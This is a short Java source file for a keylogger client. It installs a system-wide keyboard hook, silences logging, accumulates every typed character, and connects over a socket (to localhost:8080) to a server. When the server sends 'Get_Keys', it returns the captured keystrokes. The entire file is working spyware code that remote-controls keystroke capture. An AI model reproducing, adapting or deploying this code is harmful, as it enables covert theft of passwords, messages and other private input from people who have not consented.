package client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Client implements Runnable, NativeKeyListener {
	
	Socket s;
	DataInputStream din;
	DataOutputStream dout;
	Thread thread;
	Logger logger;
	
	String keys = "";
	int keyCount;
	
	
	public Client() {
		System.out.println("Connected");
		
		try {
			LogManager.getLogManager().reset();
			logger = Logger.getLogger("Key Log");
			logger.setUseParentHandlers(false);
			
			GlobalScreen.registerNativeHook();
			GlobalScreen.getInstance().addNativeKeyListener(this);
			
			s = new Socket("localhost", 8080);
			din = new DataInputStream(s.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
		
			thread = new Thread(this);
			thread.start();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void main(String[] args) {
		new Client();
	}
	
	@Override
	public void run() {
		while(true) {
			try {
				String msgin = din.readUTF();
				System.out.println("Server: " + msgin);
				
				if(msgin.equals("Get_Keys"))
					dout.writeUTF("KEYS -> " + keys);
			} catch(Exception e) {
				System.exit(-1);
			}
		}
		
	}

	public void nativeKeyPressed(NativeKeyEvent arg0) {}
	public void nativeKeyReleased(NativeKeyEvent arg0) {}
	public void nativeKeyTyped(NativeKeyEvent e) {
		String key = String.valueOf(e.getKeyChar());
		
		if(keyCount == 100) {
			keys += key + "\n";
			keyCount = 0;
		}
		else {
			keys += key;
			keyCount++;
		}
	}

}
